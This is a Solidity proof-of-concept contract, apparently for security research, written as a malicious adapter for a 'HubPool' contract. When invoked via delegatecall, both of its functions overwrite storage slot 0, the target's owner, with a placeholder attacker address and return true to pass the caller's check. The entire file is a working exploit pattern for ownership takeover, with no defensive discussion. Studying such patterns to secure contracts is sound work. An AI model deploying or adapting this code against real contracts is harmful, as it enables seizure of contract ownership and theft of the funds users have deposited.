// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title MaliciousAdapter
 * @notice This contract demonstrates how a malicious adapter could exploit the delegatecall pattern
 * @dev This is for security research purposes only
 */
contract MaliciousAdapter {
    // Storage slot 0 - matches HubPool's owner slot position
    address private _owner;
    
    /**
     * @notice This function will be called via delegatecall from HubPool
     * @dev When called via delegatecall, this executes in HubPool's context
     * and can modify HubPool's storage
     */
    function relayMessage(address target, bytes memory message) external returns (bool) {
        // Exploit: Change the owner of HubPool to attacker's address
        // This works because delegatecall executes in the caller's storage context
        _owner = address(0xBadBadBadBadBadBadBadBadBadBadBadBadBadBad);
        
        // Return true to pass the require check
        return true;
    }
    
    /**
     * @notice Alternative exploit function for token relay
     */
    function relayTokens(
        address l1Token,
        address l2Token, 
        uint256 amount,
        address to
    ) external returns (bool) {
        // Could modify critical state variables here
        _owner = address(0xBadBadBadBadBadBadBadBadBadBadBadBadBadBad);
        return true;
    }
}